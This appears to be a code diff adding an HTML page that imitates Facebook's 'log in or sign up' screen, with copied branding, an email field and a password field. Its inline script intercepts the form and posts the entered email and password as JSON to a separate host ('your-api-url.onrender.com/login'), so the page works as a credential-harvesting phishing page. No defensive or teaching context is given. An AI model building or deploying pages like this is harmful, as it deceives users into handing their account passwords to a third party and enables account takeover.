@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – log in or sign up</title>
+  <link rel="shortcut icon" href="f.png" type="image/x-icon" />
+  <link rel="stylesheet" href="signin.css" />
+</head>
+
+<body>
+  <div class="fb-root">
+    <div class="fb-container">
+      <div class="fb-left">
+        <h1>facebook</h1>
+        <p>Facebook helps you connect and share<br />with the people in your life.</p>
+      </div>
+      <div class="fb-right">
+        <form class="login-form" id="loginForm" autocomplete="off">
+          <input type="text" id="email" name="email" placeholder="Email address or phone number" required />
+          <input type="password" id="password" name="password" placeholder="Password" required />
+          <button type="submit" class="login-button">Log In</button>
+          <a href="#" class="forgot-password">Forgotten password?</a>
+          <div class="divider"></div>
+          <a href="signup.html" class="create-account">Create new account</a>
+        </form>
+        <p class="create-page">
+          <a href="#">Create a Page</a> for a celebrity, brand or business.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      try {
+        const res = await fetch("https://your-api-url.onrender.com/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email, password })
+        });
+
+        const data = await res.json();
+
+        if (res.ok) {
+          alert(data.message);
+          // Redirect to dashboard or homepage if needed
+          // window.location.href = "/home.html";
+        } else {
+          alert(data.message || "Login failed.");
+        }
+      } catch (err) {
+        alert("Something went wrong. Please try again.");
+        console.error(err);
+      }
+    });
+  </script>
+</body>
+</html>
